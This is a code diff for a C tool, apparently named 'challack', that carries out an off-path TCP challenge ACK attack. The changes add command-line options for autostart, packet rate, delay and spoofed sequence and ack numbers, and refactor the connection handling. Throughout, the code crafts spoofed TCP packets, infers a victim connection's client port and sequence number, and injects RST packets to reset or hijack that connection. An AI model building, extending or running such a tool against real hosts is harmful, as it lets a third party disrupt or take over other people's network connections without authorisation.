@@ -51,7 +51,7 @@
 // #define DEVICE "ppp0"
 #define SNAPLEN 1500
 
-#define PACKETS_PER_ROUND 4000
+#define PACKETS_PER_SECOND 4000
 #define PACKET_DELAY 100
 
 
@@ -78,19 +78,28 @@ typedef struct packet_struct {
 typedef struct conn_struct {
 	cstate_t state;
 	uint16_t id;
-	struct sockaddr_in *src;
-	struct sockaddr_in *dst;
+	struct sockaddr_in src;
+	struct sockaddr_in dst;
 	/* in host endian */
 	uint32_t seq;
 	uint32_t ack;
 } conn_t;
 
 typedef struct thctx_struct {
+	/* pcap */
 	pcap_t *pch;
 	int ipoff;
-	conn_t conn_legit;
-	conn_t conn_spoof;
+
+	/* connections */
+	conn_t legit;
+	conn_t spoof;
+
+	/* other options */
 	uint16_t winsz; // initial TCP window size
+	int autostart;
+	// inject or reset?
+	u_long packets_per_second;
+	u_long packet_delay;
 } thctx_t;
 
 /* for probing groups of values, limited by PACKETS_PER_SECOND */
@@ -110,12 +119,10 @@ static packet_t g_rst_pkt;
 
 
 /* prototypes.. */
-int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv,
-		struct sockaddr_in *pcli);
+int set_up_attack(void);
 
 uint16_t in_cksum(uint16_t *addr, size_t len);
-void tcp_init(volatile conn_t *pconn, struct sockaddr_in *psrc,
-		struct sockaddr_in *pdst, uint32_t seq);
+void tcp_init(volatile conn_t *pconn, uint32_t seq);
 int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn,
 		u_char flags, char *data, size_t len);
 int tcp_send(pcap_t *pch, volatile conn_t *pconn, u_char flags,
@@ -128,8 +135,28 @@ void setterm(int mode);
 int kbhit(void);
 
 int lookup_host(char *hostname, struct sockaddr_in *addr);
-int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, uint16_t lport,
-		int *off2ip);
+int start_pcap(pcap_t **pcap, volatile struct sockaddr_in *psrv,
+		uint16_t lport, int *off2ip);
+
+
+void usage(char *argv0)
+{
+	fprintf(stderr, "usage: %s [options] <server addr> <server port> <client addr>\n",
+			argv0);
+	fprintf(stderr, "\nsupported options:\n\n"
+			"-a             automatically start the attack\n"
+			"-d <usec>      packet delay\n"
+			"-h             this help, duh.\n"
+			// inject or reset?
+			"-p <port>      spoofed client port\n"
+			// if it differs from legit connection port
+			"-P <port>      alternate server port (advanced)\n"
+			"-r <rate>      max packets per second\n"
+			"-S <sequence>  spoofed client sequence number\n"
+			// time offset? (to avoid sync_time_with_remote)
+			"-A <sequence>  spoofed client ack number\n");
+	// XXX: support range for ports/sequence values?
+}
 
 
 /*
@@ -138,63 +165,174 @@ int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, uint16_t lport,
  */
 int main(int argc, char *argv[])
 {
-	int srvport;
+	char *argv0;
+	int c, srvport, altport = -1, cliport = -1;
 	char myhost[512];
-	struct sockaddr_in myaddr, srvaddr, cliaddr;
-
-	/* we're not leaving main until we're sure the arguments are good. */
-	if (argc < 4) {
-		fprintf(stderr, "usage: %s <server addr> <server port> <client addr> [<client port>]\n",
-				argv[0]);
-		return 1;
-	}
-
-	/* see if we can get the target server address */
-	memset(&srvaddr, 0, sizeof(srvaddr));
-	if (!lookup_host(argv[1], &srvaddr))
-		return 1;
-
-	/* see if we can get the client's address */
-	memset(&cliaddr, 0, sizeof(cliaddr));
-	if (!lookup_host(argv[3], &cliaddr))
-		return 1;
-	if (argc > 4) {
-		int cliport = atoi(argv[4]);
-		if (cliport < 1 || cliport > 65535) {
-			fprintf(stderr, "[!] %s is not a valid port.\n", argv[4]);
-			return 1;
-		}
-		cliaddr.sin_port = htons(cliport);
-	}
-	else
-		cliaddr.sin_port = 0;
-
-	/* validate and record the server port */
-	srvport = atoi(argv[2]);
-	if (srvport < 1 || srvport > 65535) {
-		fprintf(stderr, "[!] %s is not a valid port.\n", argv[2]);
-		return 1;
-	}
-	srvaddr.sin_port = htons((uint16_t)srvport);
+	struct sockaddr_in sin;
 
 	/* look up this machine's address */
-	memset(&myaddr, 0, sizeof(myaddr));
 	if (gethostname(myhost, sizeof(myhost)) == -1) {
 		perror("[!] gethostname");
 		return 1;
 	}
-	if (!lookup_host(myhost, &myaddr))
+	if (!lookup_host(myhost, &sin))
 		return 1;
+	g_ctx.legit.src = sin;
+
+	/* initalize stuff */
+	srand(getpid());
+	g_ctx.packets_per_second = PACKETS_PER_SECOND;
+	g_ctx.packet_delay = PACKET_DELAY;
+
+	argv0 = "challack";
+	if (argv && argc > 0 && argv[0])
+		argv0 = argv[0];
+
+	if (argc < 4) {
+		usage(argv0);
+		return 1;
+	}
+
+	while ((c = getopt(argc, argv, "ad:hp:P:r:S:A:")) != -1) {
+		switch (c) {
+			case '?':
+			case 'h':
+				usage(argv0);
+				return 1;
+
+			case 'a':
+				g_ctx.autostart = 1;
+				break;
+
+			case 'd':
+				{
+					char *pend = NULL;
+					u_long tmp = strtoul(optarg, &pend, 0);
+
+					if (!pend || *pend || tmp >= 1000000) {
+						fprintf(stderr, "invalid delay: %s\n", optarg);
+						return 1;
+					}
+					g_ctx.packet_delay = tmp;
+				}
+				break;
+
+			case 'p':
+				cliport = atoi(optarg);
+				if (cliport < 1 || cliport > 65535) {
+					fprintf(stderr, "[!] %s is not a valid port.\n", optarg);
+					return 1;
+				}
+				break;
+
+			case 'P':
+				altport = atoi(optarg);
+				if (altport < 1 || altport > 65535) {
+					fprintf(stderr, "[!] %s is not a valid port.\n", optarg);
+					return 1;
+				}
+				break;
+
+			case 'r':
+				{
+					char *pend = NULL;
+					u_long tmp = strtoul(optarg, &pend, 0);
+
+					if (!pend || *pend || tmp > 1000000) {
+						fprintf(stderr, "invalid packet rate: %s\n", optarg);
+						return 1;
+					}
+					g_ctx.packets_per_second = tmp;
+				}
+				break;
+
+			case 'S':
+				{
+					char *pend = NULL;
+					u_long tmp = strtoul(optarg, &pend, 0);
+
+					if (!pend || *pend) {
+						fprintf(stderr, "invalid spoof sequence number: %s\n", optarg);
+						return 1;
+					}
+					g_ctx.spoof.seq = tmp;
+				}
+				break;
+
+			case 'A':
+				{
+					char *pend = NULL;
+					u_long tmp = strtoul(optarg, &pend, 0);
+
+					if (!pend || *pend) {
+						fprintf(stderr, "invalid spoof sequence number: %s\n", optarg);
+						return 1;
+					}
+					g_ctx.spoof.ack = tmp;
+				}
+				break;
+
+			default:
+				fprintf(stderr, "invalid option '%c'! try -h ...\n", c);
+				return 1;
+				/* not reached */
+				break;
+		}
+	}
+
+	/* adjust params */
+	argc -= optind;
+	argv += optind;
+
+	/* process required arguments */
+	if (argc < 3) {
+		usage(argv0);
+		return 1;
+	}
+
+	/* see if we can get the target server address */
+	memset(&sin, 0, sizeof(sin));
+	if (!lookup_host(argv[0], &sin))
+		return 1;
+	g_ctx.legit.dst = sin;
+	g_ctx.spoof.dst = sin;
+
+	/* see if we can get the client's address */
+	if (!lookup_host(argv[2], &sin))
+		return 1;
+	g_ctx.spoof.src = sin;
+
+	/* validate and record the server port */
+	srvport = atoi(argv[1]);
+	if (srvport < 1 || srvport > 65535) {
+		fprintf(stderr, "[!] %s is not a valid port.\n", argv[1]);
+		return 1;
+	}
+	g_ctx.legit.dst.sin_port = htons((uint16_t)srvport);
+	g_ctx.spoof.dst.sin_port = htons((uint16_t)srvport);
+
+	if (cliport != -1)
+		g_ctx.spoof.src.sin_port = htons(cliport);
+	if (altport != -1)
+		g_ctx.spoof.dst.sin_port = htons(altport);
 
 	printf("[*] Launching off-path challenge ACK attack against:\n"
-			"    server: %s:%u\n", inet_ntoa(srvaddr.sin_addr),
-			ntohs(srvaddr.sin_port));
-	printf("    client: %s (port hint: %u)\n", inet_ntoa(cliaddr.sin_addr),
-			ntohs(cliaddr.sin_port));
-	printf("    from: %s\n", inet_ntoa(myaddr.sin_addr));
+			"    server: %s:%u\n", inet_ntoa(g_ctx.legit.dst.sin_addr),
+			ntohs(g_ctx.legit.dst.sin_port));
+	printf("    client: %s (port hint: %u)\n",
+			inet_ntoa(g_ctx.spoof.src.sin_addr),
+			ntohs(g_ctx.spoof.src.sin_port));
+	printf("    from: %s\n", inet_ntoa(g_ctx.legit.src.sin_addr));
+	if (g_ctx.spoof.seq)
+		printf("    spoofed sequence: %lu (0x%lx)\n", (u_long)g_ctx.spoof.seq,
+				(u_long)g_ctx.spoof.seq);
+	if (g_ctx.packets_per_second != PACKETS_PER_SECOND)
+		printf("    packets per second: %lu\n", g_ctx.packets_per_second);
+	if (g_ctx.packet_delay != PACKET_DELAY)
+		printf("    packet delay: %lu\n", g_ctx.packet_delay);
 
 	/* here we go.. WOOO */
-	return set_up_attack(&myaddr, &srvaddr, &cliaddr);
+	return set_up_attack();
 }
 
 
@@ -210,6 +348,7 @@ int lookup_host(char *hostname, struct sockaddr_in *addr)
 {
 	struct hostent *hent;
 
+	memset(addr, 0, sizeof(*addr));
 	addr->sin_family = AF_INET;
 	if (!inet_aton(hostname, &(addr->sin_addr))) {
 		hent = gethostbyname(hostname);
@@ -233,7 +372,7 @@ int lookup_host(char *hostname, struct sockaddr_in *addr)
  *
  * on succes, we return 1, on failure, 0
  */
-int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, uint16_t lport, int *off2ip)
+int start_pcap(pcap_t **pcap, volatile struct sockaddr_in *psrv, uint16_t lport, int *off2ip)
 {
    struct bpf_program bpfp; /* needed to set the filter */
    char errorstr[PCAP_ERRBUF_SIZE], filterstr[80], *iface;
@@ -362,7 +501,7 @@ void *recv_thread(void *arg)
 int prepare_rst_packet(packet_t *ppkt)
 {
 	uint32_t old_seq;
-	volatile conn_t *legit = &(g_ctx.conn_legit);
+	volatile conn_t *legit = &(g_ctx.legit);
 
 	/* save the old sequence number */
 	old_seq = legit->seq;
@@ -550,7 +689,7 @@ int sync_time_with_remote(void)
  */
 chunk_t *build_schedule(u_long start, u_long end, int *pnchunks)
 {
-	int i, num, nchunks, chunk_sz = PACKETS_PER_ROUND;
+	int i, num, nchunks, chunk_sz = g_ctx.packets_per_second;
 	chunk_t *schedule = NULL;
 
 	num = end - start;
@@ -583,7 +722,7 @@ chunk_t *build_schedule(u_long start, u_long end, int *pnchunks)
  */
 chunk_t *build_schedule_reverse(u_long start, u_long end, int *pnchunks)
 {
-	int i, j, num, nchunks, chunk_sz = PACKETS_PER_ROUND;
+	int i, j, num, nchunks, chunk_sz = g_ctx.packets_per_second;
 	chunk_t *schedule = NULL;
 
 	num = end - start;
@@ -625,11 +764,11 @@ int infer_four_tuple(void)
 #ifdef DEBUG_TUPLE_INFER_SPOOF_SEND
 	struct timeval now, diff;
 #endif
-	volatile conn_t *spoof = &(g_ctx.conn_spoof);
+	volatile conn_t *spoof = &(g_ctx.spoof);
 	int test_mode = -1;
 	/* chunk-based search vars */
 	chunk_t *sched = NULL;
-	int nchunks, ci = 0;
+	int nchunks = 0, ci = 0;
 	/* binary search vars */
 	u_long bs_start = 0, bs_end = 0, bs_mid = 0;
 
@@ -645,21 +784,21 @@ int infer_four_tuple(void)
 		/* we have three possibilities:
 		 * 1. we have a port hint -- we just want to test that one (but fall
 		 *    back if it fails) -- test_mode:0
-		 * 2. we have > PACKETS_PER_ROUND ports to test -- we want to use a
+		 * 2. we have > PACKETS_PER_SECOND ports to test -- we want to use a
 		 *    schedule -- test_mode:1
-		 * 3. we have < PACKETS_PER_ROUND ports to test -- we want to use a
+		 * 3. we have < PACKETS_PER_SECOND ports to test -- we want to use a
 		 *    modified binary search. -- test_mode:2
 		 */
 
 		/* if we need to initialize the ranges, do so now */
 		if (test_mode == -1) {
 			/* if we already have a guess, try it first */
-			if (spoof->src->sin_port) {
+			if (spoof->src.sin_port) {
 				/* if it hits, we set these equal to signify a win.
 				 *
 				 * we leave guess_mid set to 0 in case we missed..
 				 */
-				bs_mid = bs_start = bs_end = ntohs(spoof->src->sin_port);
+				bs_mid = bs_start = bs_end = ntohs(spoof->src.sin_port);
 				test_mode = 0;
 			}
 			/* no initial guess available... */
@@ -692,10 +831,10 @@ int infer_four_tuple(void)
 			bs_mid = bs_start = sched[ci].start;
 			bs_end = sched[ci].end;
 			for (guess = bs_start; guess < bs_end; guess++) {
-				spoof->src->sin_port = htons(guess);
+				spoof->src.sin_port = htons(guess);
 				if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
 					return 0;
-				usleep(PACKET_DELAY);
+				usleep(g_ctx.packet_delay);
 			}
 
 			/* we'll do maintenance after we check the results */
@@ -705,15 +844,15 @@ int infer_four_tuple(void)
 
 			bs_mid = (bs_start + bs_end) / 2;
 			for (guess = bs_mid; guess < bs_end; guess++) {
-				spoof->src->sin_port = htons(guess);
+				spoof->src.sin_port = htons(guess);
 				if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
 					return 0;
-				usleep(PACKET_DELAY);
+				usleep(g_ctx.packet_delay);
 			}
 		}
 
 		/* ensure we only send a single value once */
-		spoof->src->sin_port = 0;
+		spoof->src.sin_port = 0;
 
 #ifdef DEBUG_TUPLE_INFER_SPOOF_SEND
 		gettimeofday(&now, NULL);
@@ -766,16 +905,14 @@ int infer_four_tuple(void)
 			if (test_mode == 0) {
 				/* correct! */
 				printf("[*] Confirmed client port (from hint): %lu\n", bs_start);
-				spoof->src->sin_port = ntohs(bs_start);
-				free(sched);
+				spoof->src.sin_port = ntohs(bs_start);
 				return 1;
 			} else if (test_mode == 1) {
 				/* proceed to a binary search of this block */
 				/* if there was only one port tested, it must be it! */
 				if (bs_end - bs_start <= 1) {
 					printf("[*] Confirmed client port (via chunk): %lu\n", bs_start);
-					spoof->src->sin_port = ntohs(bs_start);
-					free(sched);
+					spoof->src.sin_port = ntohs(bs_start);
 					return 1;
 				}
 				test_mode = 2;
@@ -785,14 +922,12 @@ int infer_four_tuple(void)
 					// XXX: is this ever actually reached??
 					/* special handling for hinted guess?? */
 					printf("[*] Confirmed client port (eh?): %lu\n", bs_start);
-					spoof->src->sin_port = ntohs(bs_start);
-					free(sched);
+					spoof->src.sin_port = ntohs(bs_start);
 					return 1;
 				} else if (bs_end - bs_mid == 1) {
 					/* we legitimately guessed it via binary search! */
 					printf("[*] Guessed client port (via binary search): %lu\n", bs_mid);
-					spoof->src->sin_port = ntohs(bs_mid);
-					free(sched);
+					spoof->src.sin_port = ntohs(bs_mid);
 					return 1;
 				}
 				else
@@ -802,6 +937,7 @@ int infer_four_tuple(void)
 		} else {
 			// XXX: TODO: scale number of guesses per round based on feedback
 			fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
+			g_chack_cnt = 0;
 		}
 	}
 
@@ -828,13 +964,13 @@ int infer_four_tuple(void)
 int infer_sequence_number(void)
 {
 	struct timeval round_start, now, diff;
-	volatile conn_t *spoof = &(g_ctx.conn_spoof);
+	volatile conn_t *spoof = &(g_ctx.spoof);
 	int step = -1;
 	/* printing status */
 	u_long pr_start, pr_end, pkts_sent;
 	/* chunk-based search vars */
 	chunk_t *sched = NULL;
-	int nchunks, ci = 0;
+	int nchunks = 0, ci = 0;
 	/* binary search vars */
 	u_long bs_start = 0, bs_end = 0, bs_mid = 0;
 
@@ -871,7 +1007,7 @@ int infer_sequence_number(void)
 				spoof->seq = seq_block * g_ctx.winsz;
 				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
 					return 0;
-				usleep(PACKET_DELAY);
+				usleep(g_ctx.packet_delay);
 				pkts_sent++;
 			}
 			/* we'll do maintenance after we check the results */
@@ -891,7 +1027,7 @@ int infer_sequence_number(void)
 				spoof->seq = seq_block * g_ctx.winsz;
 				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
 					return 0;
-				usleep(PACKET_DELAY);
+				usleep(g_ctx.packet_delay);
 				pkts_sent++;
 			}
 			/* we'll do maintenance after we check the results */
@@ -908,7 +1044,7 @@ int infer_sequence_number(void)
 				spoof->seq = seq_guess;
 				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
 					return 0;
-				usleep(PACKET_DELAY);
+				usleep(g_ctx.packet_delay);
 				pkts_sent++;
 			}
 			/* we'll do maintenance after we check the results */
@@ -958,8 +1094,7 @@ int infer_sequence_number(void)
 				}
 			} else if (step == 3) {
 			}
-		} else if (g_chack_cnt < 100) {
-			// XXX: TODO: adjust winsz if g_chack_cnt < 99?
+		} else if (g_chack_cnt == 99) {
 			if (step == 0) {
 				/* figure out which chunk exactly! */
 				bs_start = sched[ci].start;
@@ -1005,6 +1140,11 @@ int infer_sequence_number(void)
 			} else if (step == 3) {
 			}
 		}
+#if 0
+		// XXX: TODO: adjust winsz if g_chack_cnt < 99?
+		else if (g_chack_cnt < 99) {
+		}
+#endif
 		else {
 			// XXX: TODO: scale number of guesses per round based on feedback
 			fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
@@ -1039,6 +1179,13 @@ int conduct_offpath_attack(void)
 	/* spawn the recv thread. it will live throughout the attack process... */
 	if (pthread_create(&rth, NULL, recv_thread, NULL)) {
 		fprintf(stderr, "[!] failed to start recv thread!\n");
+		return 0;
+	}
+
+	/* if we have both a seq and a client port, just send an RST */
+	if (g_ctx.spoof.src.sin_port && g_ctx.spoof.seq) {
+		if (!tcp_send(g_ctx.pch, &(g_ctx.spoof), TH_RST, NULL, 0))
+			return 0;
 		return 0;
 	}
 
@@ -1080,9 +1227,9 @@ int conduct_offpath_attack(void)
  * control-[ (Esc)   closes connection and exits
  * "start\n"         launches the offpath attack (after connected)
  */
-int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct sockaddr_in *pcli)
+int set_up_attack(void)
 {
-	int lport = getpid() + 1000;
+	uint16_t lport = rand() & 0xffff;
 	pcap_t *pch = NULL;
 	struct pcap_pkthdr *pchdr = NULL;
 	const u_char *inbuf = NULL;
@@ -1092,23 +1239,24 @@ int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct soc
 	volatile conn_t *pconn;
 	int ipoff;
 
-	printf("[*] Selected local port: %d\n", lport);
+	printf("[*] Selected local port: %u\n", lport);
 
-	if (!start_pcap(&pch, psrv, lport, &ipoff)) {
+	pconn = &g_ctx.legit;
+	if (!start_pcap(&pch, &(pconn->dst), lport, &ipoff)) {
 		pcap_perror(pch, "[!] Unable to start packet capture");
 		return 1;
 	}
+	g_ctx.pch = pch;
 	g_ctx.ipoff = ipoff;
 
 	/* set the local port */
-	ploc->sin_port = htons(lport);
+	pconn->src.sin_port = htons(lport);
 
 	/* initialize the parts of the spoofed connection we know.. */
-	tcp_init(&(g_ctx.conn_spoof), pcli, psrv, 0);
+	tcp_init(&g_ctx.spoof, 0);
 
 	/* make a legit connection to the server */
-	pconn = &(g_ctx.conn_legit);
-	tcp_init(pconn, ploc, psrv, getpid() * 3000);
+	tcp_init(pconn, rand());
 	if (!tcp_send(pch, pconn, TH_SYN, NULL, 0))
 		return 1;
 	pconn->state = CS_SYN_SENT;
@@ -1137,6 +1285,13 @@ int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct soc
 
 							printf("[*] TCP handshake complete! Entering interactive session...\n");
 							setterm(0);
+
+							if (g_ctx.autostart) {
+								printf("[*] Commencing attack in 1 second...\n");
+								sleep(1);
+								if (!conduct_offpath_attack())
+									return 1;
+							}
 						}
 						break;
 
@@ -1214,10 +1369,6 @@ int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct soc
 
 					/* start the attack now! */
 					if (strncmp(outbuf, "start\n", 6) == 0) {
-
-						/* fill in most of the context */
-						g_ctx.pch = pch;
-
 						if (!conduct_offpath_attack())
 							return 1;
 					} else {
@@ -1270,14 +1421,12 @@ int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct soc
 /*
  * initialize a connection structure from the parameters
  */
-void tcp_init(volatile conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_in *pdst, uint32_t seq)
+void tcp_init(volatile conn_t *pconn, uint32_t seq)
 {
-	pconn->id = (getpid() + 1337) & 0xffff;
+	pconn->id = rand() % 0xffff;
 	pconn->state = CS_NEW;
-	pconn->src = psrc;
-	pconn->dst = pdst;
-	pconn->seq = seq;
-	pconn->ack = 0;
+	if (!pconn->seq)
+		pconn->seq = seq;
 }
 
 
@@ -1340,15 +1489,15 @@ int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags
 	ip.ip_ttl = 255;
 	ip.ip_p = IPPROTO_TCP;
 	ip.ip_sum = 0;
-	ip.ip_src.s_addr = pconn->src->sin_addr.s_addr;
-	ip.ip_dst.s_addr = pconn->dst->sin_addr.s_addr;
+	ip.ip_src.s_addr = pconn->src.sin_addr.s_addr;
+	ip.ip_dst.s_addr = pconn->dst.sin_addr.s_addr;
 
 	/* calculate the IP checksum */
 	ip.ip_sum = in_cksum((uint16_t *)&ip, sizeof(ip));
 
 	/* construct the TCP header */
-	tcp.th_sport = pconn->src->sin_port;
-	tcp.th_dport = pconn->dst->sin_port;
+	tcp.th_sport = pconn->src.sin_port;
+	tcp.th_dport = pconn->dst.sin_port;
 	tcp.th_seq = htonl(pconn->seq);
 	tcp.th_ack = htonl(pconn->ack);
 	tcp.th_x2 = 0;
@@ -1386,8 +1535,8 @@ int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags
 	{
 		char shost[32], dhost[32];
 
-		strcpy(shost, inet_ntoa(pconn->src->sin_addr));
-		strcpy(dhost, inet_ntoa(pconn->dst->sin_addr));
+		strcpy(shost, inet_ntoa(pconn->src.sin_addr));
+		strcpy(dhost, inet_ntoa(pconn->dst.sin_addr));
 		printf("[*] %s : %s:%d --> %s:%d : %s : seq %lu, ack %lu (len %lu)\n",
 				g_conn_states[pconn->state],
 				shost, ntohs(tcp.th_sport),
@@ -1480,7 +1629,7 @@ int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, uint32_t
 				ptcp+1, (uint32_t)pph->caplen);
 		 */
 		printf("[*] %s : %s:%d <-- %s:%d : %s : seq %lu, ack %lu (len %lu)\n",
-				g_conn_states[g_ctx.conn_legit.state],
+				g_conn_states[g_ctx.legit.state],
 				dhost, ntohs(ptcp->th_dport),
 				shost, ntohs(ptcp->th_sport),
 				tcp_flags(ptcp->th_flags),
